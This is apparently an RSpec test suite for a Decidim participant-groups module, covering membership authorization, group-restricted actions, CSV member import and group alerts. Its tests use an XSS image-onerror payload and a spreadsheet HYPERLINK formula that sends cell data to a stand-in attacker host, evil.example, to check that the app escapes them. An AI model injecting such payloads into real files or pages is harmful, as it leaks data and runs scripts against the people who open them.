# frozen_string_literal: true

require "rails_helper"

# Plan U5 / KTD4 / KTD7: participant groups, the `cct_group_membership` authorization they
# grant, the `allowed_groups` action authorizer, CSV import and group alerts.
RSpec.describe Cct::Groups do
  include ActiveJob::TestHelper

  let(:workflow) { Cct::Groups::WORKFLOW }
  let(:organization) { create(:organization, available_locales: %w(en af xh), default_locale: "en", available_authorizations: [workflow]) }
  let(:other_organization) { create(:organization, available_locales: %w(en), default_locale: "en", available_authorizations: [workflow]) }
  let(:admin) { create(:user, :admin, :confirmed, organization:) }
  let(:committee) { create(:cct_group, organization:, slug: "ward-57-committee", name: { "en" => "Ward 57 Ward Committee", "af" => "Wyk 57 se wykskomitee", "xh" => "Ikomiti yewadi 57" }) }
  let(:forum) { create(:cct_group, organization:, slug: "ngo-forum", name: { "en" => "NGO Forum" }) }
  let(:base) { "/en/admin/participant_groups" }
  let(:xss) { "<img src=x onerror=alert(1)>" }

  def user(org = organization, **)
    create(:user, :confirmed, organization: org, **)
  end

  def metadata_groups(user) = Cct::Groups.authorization_for(user)&.metadata&.fetch("groups")

  describe "groups" do
    it "requires a slug unique per organization, but allows the same slug in another organization" do
      create(:cct_group, organization:, slug: "ward-57-committee")

      expect(build(:cct_group, organization:, slug: "ward-57-committee")).not_to be_valid
      expect { create(:cct_group, organization:, slug: "ward-57-committee") }.to raise_error(ActiveRecord::RecordInvalid)
      expect { Cct::Groups::Group.new(organization:, slug: "ward-57-committee", name: { "en" => "x" }).save!(validate: false) }
        .to raise_error(ActiveRecord::RecordNotUnique)
      expect(create(:cct_group, organization: other_organization, slug: "ward-57-committee")).to be_persisted
    end

    it "rejects malformed slugs and never changes a slug" do
      %w(Ward57 ward_57 -ward ward- ward--57).push("a" * 61, "").each do |slug|
        expect(build(:cct_group, organization:, slug:)).not_to be_valid, slug
      end
      committee.slug = "renamed"
      expect(committee).not_to be_valid
    end

    it "reports a duplicate slug on the admin form" do
      committee
      form = Cct::Groups::Admin::GroupForm.from_params(cct_group: { slug: "ward-57-committee", name_en: "Copy" })
                                          .with_context(current_organization: organization, current_user: admin)
      expect(form).not_to be_valid
      expect(form.errors[:slug]).to be_present

      other_form = Cct::Groups::Admin::GroupForm.from_params(cct_group: { slug: "ward-57-committee", name_en: "Copy" })
                                                .with_context(current_organization: other_organization, current_user: create(:user, :admin, organization: other_organization))
      expect(other_form).to be_valid
    end
  end

  describe "membership and the cct_group_membership authorization" do
    let(:participant) { user }

    it "is granted, extended, reduced and removed with the memberships" do
      Cct::Groups.add_member!(committee, participant)
      authorization = Cct::Groups.authorization_for(participant)
      expect(authorization).to be_granted
      expect(metadata_groups(participant)).to eq(["ward-57-committee"])

      Cct::Groups.add_member!(forum, participant)
      expect(metadata_groups(participant)).to eq(%w(ngo-forum ward-57-committee))
      expect(Decidim::Authorization.where(user: participant, name: workflow).count).to eq(1)

      Cct::Groups.remove_member!(committee, participant)
      expect(metadata_groups(participant)).to eq(["ngo-forum"])

      Cct::Groups.remove_member!(forum, participant)
      expect(Cct::Groups.authorization_for(participant)).to be_nil
    end

    it "is idempotent" do
      expect(Cct::Groups.add_member!(committee, participant)).to be(true)
      expect(Cct::Groups.add_member!(committee, participant)).to be(false)
      expect(committee.memberships.count).to eq(1)
    end

    it "resyncs every former member when a group is deleted" do
      both = user
      only_committee = user
      [both, only_committee].each { |member| Cct::Groups.add_member!(committee, member) }
      Cct::Groups.add_member!(forum, both)

      Cct::Groups::Admin::DestroyGroup.call(committee, admin)

      expect(Cct::Groups::Membership.where(cct_group_id: committee.id)).to be_empty
      expect(metadata_groups(both)).to eq(["ngo-forum"])
      expect(Cct::Groups.authorization_for(only_committee)).to be_nil
    end

    it "never mixes organizations" do
      foreign = user(other_organization)
      expect { Cct::Groups.add_member!(committee, foreign) }.to raise_error(ArgumentError)
      expect(Cct::Groups::Membership.new(group: committee, user: foreign)).not_to be_valid
      expect(Cct::Groups.find_member_candidate(organization, foreign.email)).to be_nil
    end

    it "is removed when the participant deletes their account" do
      Cct::Groups.add_member!(committee, participant)
      form = Decidim::DeleteAccountForm.from_params(delete_reason: "moving").with_context(current_user: participant)

      Decidim::DestroyAccount.call(form)

      expect(committee.memberships.reload).to be_empty
      expect(Cct::Groups.authorization_for(participant)).to be_nil
    end
  end

  describe Cct::Authorizations::GroupActionAuthorizer do
    let(:process) { create(:participatory_process, :with_steps, :published, organization:) }
    let(:component) { create(:proposal_component, :published, participatory_space: process) }

    def restrict!(groups)
      component.update!(permissions: { "create" => { "authorization_handlers" => { workflow => { "options" => { "allowed_groups" => groups } } } } })
    end

    def status_for(user) = Decidim::ActionAuthorizer.new(user, "create", component, nil).authorize

    def messages(status)
      status.statuses.flat_map { |s| Array(s.data[:extra_explanation]).map { |extra| I18n.t(extra[:key], **extra[:params]) } }
    end

    before do
      committee
      restrict!("ward-57-committee")
    end

    it "is registered as an admin-granted workflow with an allowed_groups option" do
      manifest = Decidim::Verifications.find_workflow_manifest(workflow)
      expect(manifest.type).to eq("multistep")
      expect(manifest.form).to be_nil
      expect(manifest.options.attributes.keys.map(&:to_s)).to eq(["allowed_groups"])
      expect(Decidim.authorization_handlers.map(&:name)).not_to include(workflow)
    end

    it "lets a member of an allowed group act" do
      member = user
      Cct::Groups.add_member!(committee, member)
      expect(status_for(member)).to be_ok
    end

    it "refuses a non-member with an explanation to ask an administrator" do
      status = status_for(user)
      expect(status.global_code).to eq(:unauthorized)
      expect(status.statuses.first.data[:action]).to be_nil
      expect(messages(status).join).to eq(
        "This action is only open to members of the group Ward 57 Ward Committee. Group membership is managed by the " \
        "administrators: ask an administrator to add you to the group."
      )
    end

    it "refuses a member of another group only" do
      member = user
      Cct::Groups.add_member!(forum, member)
      expect(status_for(member).global_code).to eq(:unauthorized)
    end

    it "accepts a comma list of groups" do
      restrict!(" ngo-forum , ward-57-committee;other ")
      member = user
      Cct::Groups.add_member!(forum, member)
      expect(status_for(member)).to be_ok
    end

    it "with no groups listed, accepts members of any group only" do
      restrict!("")
      member = user
      Cct::Groups.add_member!(forum, member)
      expect(status_for(member)).to be_ok
      expect(status_for(user).global_code).to eq(:unauthorized)
    end

    it "never takes a same-slug group of another organization into account" do
      foreign_group = create(:cct_group, organization: other_organization, slug: "ward-57-committee")
      foreign_member = user(other_organization)
      Cct::Groups.add_member!(foreign_group, foreign_member)
      local = user(email: foreign_member.email)

      expect(status_for(local).global_code).to eq(:unauthorized)
      expect(Decidim::Verifications::Authorizations.new(organization:, name: workflow).query).to be_empty
    end

    it "explains the restriction in Afrikaans and isiXhosa" do
      I18n.with_locale(:af) do
        expect(messages(status_for(user)).join).to include("net oop vir lede van die groep Wyk 57 se wykskomitee", "vra 'n administrateur")
      end
      I18n.with_locale(:xh) do
        expect(messages(status_for(user)).join).to include("kumalungu eqela Ikomiti yewadi 57", "cela umlawuli")
      end
    end

    describe "pages", type: :request do
      let(:referer) { { "Referer" => "https://#{organization.host}/en/processes/#{process.slug}/f/#{component.id}/proposals" } }

      before do
        host! organization.host
        https!
      end

      it "explains the restriction in the authorization modal, escaping group names" do
        committee.update!(name: { "en" => "Committee #{xss}" })
        login_as user, scope: :user

        get "/authorization_modals/create/f/#{component.id}", params: { locale: "en" }, headers: referer

        expect(response).to have_http_status(:ok)
        expect(response.body).to include("only open to members of the group Committee &lt;img src=x onerror=alert(1)&gt;")
        expect(response.body).not_to include(xss)
      end

      it "asks an anonymous visitor to sign in before proposing" do
        get "/en/processes/#{process.slug}/f/#{component.id}/proposals"
        expect(response).to have_http_status(:ok)
        expect(response.body).not_to include('data-dialog-open="authorizationModal"')
      end

      it "sends a participant from the workflow entry point to their authorizations with an explanation" do
        login_as user, scope: :user
        get "/en/cct_group_membership"
        expect(response).to have_http_status(:found)
        expect(response.location).to end_with("/authorizations")
        expect(flash[:notice]).to eq("Group membership is managed by the administrators. Ask an administrator to add you to the group.")
      end
    end
  end

  describe "CSV import", type: :request do
    let!(:valid) { Array.new(3) { |i| user(email: "valid#{i}@example.org") } }
    let!(:foreign) { user(other_organization, email: "foreign@example.org") }
    let(:formula) { %(=HYPERLINK("http://evil.example/?"&A1,"click")) }

    def upload(content)
      Rack::Test::UploadedFile.new(StringIO.new(content), "text/csv", original_filename: "members.csv")
    end

    before do
      host! organization.host
      https!
      login_as admin, scope: :user
    end

    it "adds the organization's participants and reports unknown and other-organization emails" do
      csv = "email\nvalid0@example.org\nVALID1@example.org\nvalid2@example.org\nunknown@example.org\nforeign@example.org\n"

      post "#{base}/groups/#{committee.id}/members_import", params: { file: upload(csv) }

      expect(response).to have_http_status(:ok)
      expect(committee.users.reload).to match_array(valid)
      expect(response.body).to include("3 participants added.", "2 rows rejected.", "unknown@example.org", "foreign@example.org")
      expect(response.body.scan("No participant with this email in this organization").size).to eq(2)
      expect(Cct::Groups::Membership.joins(:user).where(decidim_users: { decidim_organization_id: other_organization.id })).to be_empty
      valid.each { |member| expect(metadata_groups(member)).to eq(["ward-57-committee"]) }
      expect(Decidim::ActionLog.where(resource_id: committee.id, action: "import_members").sole.extra["import"])
        .to include("added" => 3, "rejected" => 2)
    end

    it "treats a formula payload as plain text and escapes it in the report" do
      csv = CSV.generate { |rows| rows << [formula] << [xss] << ["valid0@example.org"] }

      post "#{base}/groups/#{committee.id}/members_import", params: { file: upload(csv) }

      expect(response).to have_http_status(:ok)
      expect(committee.users.reload).to eq([valid.first])
      expect(response.body).to include(ERB::Util.html_escape(formula), "&lt;img src=x onerror=alert(1)&gt;")
      expect(response.body).not_to include(xss)
      expect(response.body.scan("Not a valid email address").size).to eq(2)
    end

    it "caps the number of rows and the file size, and refuses malformed files" do
      stub_const("Cct::Groups::Admin::ImportMembersCsv::MAX_ROWS", 2)
      post "#{base}/groups/#{committee.id}/members_import", params: { file: upload(valid.map(&:email).join("\n")) }
      expect(committee.users.reload.count).to eq(2)
      expect(response.body).to include("Only the first 2 rows were read.")

      stub_const("Cct::Groups::Admin::ImportMembersCsv::MAX_BYTES", 10)
      post "#{base}/groups/#{committee.id}/members_import", params: { file: upload("a" * 11) }
      expect(flash[:alert]).to include("too large")

      post "#{base}/groups/#{forum.id}/members_import", params: { file: upload(%("unclosed\n)) }
      expect(flash[:alert]).to include("could not be read")
      expect(forum.users).to be_empty
    end
  end

  describe "escaping in the admin", type: :request do
    before do
      host! organization.host
      https!
      login_as admin, scope: :user
    end

    it "escapes group names in the group list, the members page and the admin log" do
      group = create(:cct_group, organization:, slug: "xss", name: { "en" => xss })
      member = user
      member.update_columns(name: "Member #{xss}") # names are validated; simulate legacy data
      post "#{base}/groups/#{group.id}/members", params: { cct_group_member: { email: member.email } }

      [base + "/groups", "#{base}/groups/#{group.id}/members", "#{base}/alerts/new"].each do |path|
        get path
        expect(response).to have_http_status(:ok), path
        expect(response.body).to include("&lt;img src=x onerror=alert(1)&gt;"), path
        expect(response.body).not_to include(xss), path
      end

      get "/en/admin/logs"
      expect(response.body).to include("added Member", "to the participant group")
      expect(response.body).not_to include(xss)
    end
  end

  describe "alerts" do
    let(:process) { create(:participatory_process, :published, organization:, title: { "en" => "Short-term letting by-law" }) }
    let!(:members) { Array.new(2) { user } }
    let!(:outsider) { user }

    before { members.each { |member| Cct::Groups.add_member!(committee, member) } }

    def notifications(user) = Decidim::Notification.where(decidim_user_id: user.id)

    def alert_params(token = SecureRandom.uuid, group: committee, message: "Please comment by Friday")
      { cct_group_alert: { group_id: group.id, space: "participatory_processes:#{process.id}", message:, token: } }
    end

    describe "requests", type: :request do
      before do
        host! organization.host
        https!
        login_as admin, scope: :user
      end

      it "notifies each member exactly once, nobody else, and never twice for the same form" do
        token = SecureRandom.uuid
        perform_enqueued_jobs do
          2.times { post "#{base}/alerts", params: alert_params(token) }
        end

        members.each { |member| expect(notifications(member).count).to eq(1) }
        expect(notifications(outsider)).to be_empty
        expect(notifications(admin)).to be_empty
        expect(Cct::Groups::Alert.where(organization:).sole.recipients_count).to eq(2)
        expect(flash[:notice]).to eq("This alert was already sent; it was not sent again.")
        expect(Decidim::ActionLog.where(resource_id: committee.id, action: "alert").count).to eq(1)

        perform_enqueued_jobs { post "#{base}/alerts", params: alert_params }
        members.each { |member| expect(notifications(member).count).to eq(2) }
      end

      it "rejects a space or group of another organization, an unpublished space and a missing token" do
        foreign_process = create(:participatory_process, :published, organization: other_organization)
        unpublished = create(:participatory_process, :unpublished, organization:)
        foreign_group = create(:cct_group, organization: other_organization)

        perform_enqueued_jobs do
          post "#{base}/alerts", params: alert_params.deep_merge(cct_group_alert: { space: "participatory_processes:#{foreign_process.id}" })
          expect(response).to have_http_status(:unprocessable_content)
          post "#{base}/alerts", params: alert_params.deep_merge(cct_group_alert: { space: "participatory_processes:#{unpublished.id}" })
          expect(response).to have_http_status(:unprocessable_content)
          post "#{base}/alerts", params: alert_params(group: foreign_group)
          expect(response).to have_http_status(:unprocessable_content)
          post "#{base}/alerts", params: alert_params(nil)
          expect(response).to have_http_status(:unprocessable_content)
        end

        expect(Cct::Groups::Alert.count).to eq(0)
        expect(Decidim::Notification.count).to eq(0)
      end

      def token_in(body)
        input = body[/<input[^>]*name="cct_group_alert\[token\]"[^>]*>/]
        input && input[/value="([^"]+)"/, 1]
      end

      it "offers a fresh token on each form" do
        get "#{base}/alerts/new", params: { group_id: committee.id }
        first = token_in(response.body)
        get "#{base}/alerts/new"
        second = token_in(response.body)
        expect([first, second].compact.size).to eq(2)
        expect(first).not_to eq(second)
      end
    end

    it "escapes the group name and the message in the notification" do
      committee.update!(name: { "en" => "Committee #{xss}" })
      form = Cct::Groups::Admin::AlertForm.from_params(alert_params(message: "Read this #{xss}"))
                                          .with_context(current_organization: organization, current_user: admin)
      perform_enqueued_jobs { Cct::Groups::Admin::AlertGroup.call(form) }

      notification = notifications(members.first).sole
      event = notification.event_class_instance
      expect(event.notification_title).to include("Committee &lt;img src=x onerror=alert(1)&gt;", "Short-term letting by-law")
      expect(event.notification_title).not_to include(xss)
      expect(event.safe_resource_text).to eq("Read this &lt;img src=x onerror=alert(1)&gt;")
      expect(event.email_subject).not_to include(xss)
      expect(event.email_intro).not_to include(xss)
    end

    describe "the member's notifications page", type: :request do
      it "shows the alert, escaped" do
        committee.update!(name: { "en" => "Committee #{xss}" })
        form = Cct::Groups::Admin::AlertForm.from_params(alert_params)
                                            .with_context(current_organization: organization, current_user: admin)
        perform_enqueued_jobs { Cct::Groups::Admin::AlertGroup.call(form) }

        host! organization.host
        https!
        login_as members.first, scope: :user
        get "/en/notifications"

        expect(response).to have_http_status(:ok)
        expect(response.body).to include("As a member of Committee &lt;img src=x onerror=alert(1)&gt;", "Short-term letting by-law")
        expect(response.body).not_to include(xss)
      end
    end
  end
end
